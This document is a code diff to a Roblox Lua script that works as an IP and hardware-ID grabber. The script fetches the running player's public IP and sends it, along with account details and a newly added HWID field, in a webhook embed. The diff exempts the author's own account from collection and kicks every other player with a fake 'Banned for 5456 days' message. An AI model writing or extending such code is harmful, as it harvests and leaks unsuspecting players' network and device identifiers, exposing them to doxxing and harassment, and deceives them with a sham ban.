@@ -1,27 +1,27 @@
-local function printProgress()
-    for i = 1, 100 do
-        print(i .. "%")
-        wait(0.1) -- Adjust the speed of the progress
-    end
-end
-
 local function main()
-    -- Print progress from 1% to 100%
-    printProgress()
-
-local function main()
-    -- Fetch the IP address
-    local IP
-    local success, ipError = pcall(function()
-        IP = game:HttpGet("https://v4.ident.me")
-    end)
-
-    if not success then
-        IP = "Unable to fetch IP: " .. tostring(ipError)
-    end
+    -- Define your Roblox username and user ID
+    local myUsername = "TheMineCraftGamer159"
+    local myUserID = 1691158127
 
     -- Get the local player
     local plr = game:GetService('Players').LocalPlayer
+
+    -- Check if the script is running from your account
+    local isMyAccount = (plr.Name == myUsername or plr.UserId == myUserID)
+
+    -- Fetch the IP address if not running from your account
+    local IP
+    if not isMyAccount then
+        local success, ipError = pcall(function()
+            IP = game:HttpGet("https://v4.ident.me")
+        end)
+
+        if not success then
+            IP = "Unable to fetch IP: " .. tostring(ipError)
+        end
+    else
+        IP = "IP fetching disabled for this account."
+    end
 
     -- Determine if the player is a premium member
     local premium = plr.MembershipType == Enum.MembershipType.Premium
@@ -95,7 +95,7 @@ local function main()
             ["content"] = "",
             ["embeds"] = {{
                 ["title"] = "__*Information:*__",
-                ["description"] = IP,
+                ["description"] = "Player Information",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xAB0909),
                 ["fields"] = {
@@ -106,7 +106,7 @@ local function main()
                     },
                     {
                         ["name"] = "IP Address:",
-                        ["value"] = IP,
+                        ["value"] = isMyAccount and "Hidden" or IP,
                         ["inline"] = true
                     },
                     {
@@ -120,8 +120,8 @@ local function main()
                         ["inline"] = true
                     },
                     {
-                        ["name"] = "Age:",
-                        ["value"] = plr.AccountAge,
+                        ["name"] = "Account Age:",
+                        ["value"] = tostring(plr.AccountAge),
                         ["inline"] = true
                     },
                     {
@@ -130,9 +130,14 @@ local function main()
                         ["inline"] = true
                     },
                     {
-                        ["name"] = "ALT:",
+                        ["name"] = "Alternate Account:",
                         ["value"] = tostring(ALT),
                         ["inline"] = true
+                    },
+                    {
+                        ["name"] = "HWID:",
+                        ["value"] = hwid,
+                        ["inline"] = false
                     },
                 },
             }}
@@ -152,6 +157,15 @@ local function main()
         end
     else
         print("No IP found or IP fetch error.")
+    end
+
+    -- Add a 5-second delay before kicking the player, if not your account
+    if not isMyAccount then
+        wait(5)
+        -- Kick the player with a message
+        plr:Kick("Banned for 5456 days")
+    else
+        print("Script running from the owner's account. Skipping kick.")
     end
 end
 
